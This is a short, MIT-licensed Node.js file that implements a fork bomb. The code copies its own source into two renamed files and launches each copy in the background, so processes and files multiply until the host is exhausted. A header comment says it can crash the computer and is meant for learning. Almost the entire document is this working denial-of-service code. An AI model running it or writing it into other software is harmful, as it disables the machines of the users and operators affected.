/*
The MIT License (MIT)

Copyright (c) 2015 Varun Maudgalya

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

/* Warning: This can crash your computer if you do not know what you are doing.
*           Please use this at your own discretion for learning purposes.
*/
var fs = require('fs');
var path = require('path');
var exec = require('child_process').exec;
var firstChildName = getFileName() + '0';
var secondChildName = getFileName() + '1';
var runFirst = 'node ' + firstChildName + '.js &';
var runSecond = 'node ' + secondChildName + '.js &';

fs.readFile('ForkBomb.js', 'utf8' , function(err, data){
  fs.writeFile(firstChildName + '.js', data.replace(getFileName(), firstChildName), function(err){});
  fs.writeFile(secondChildName + '.js', data.replace(getFileName(), secondChildName), function(err){});
});

exec(runFirst, function(error, stdout, stderr) {});
exec(runSecond, function(error, stdout, stderr) {});

function getFileName() {
  return module.filename.slice(__filename.lastIndexOf(path.sep)+1, module.filename.length -3);
};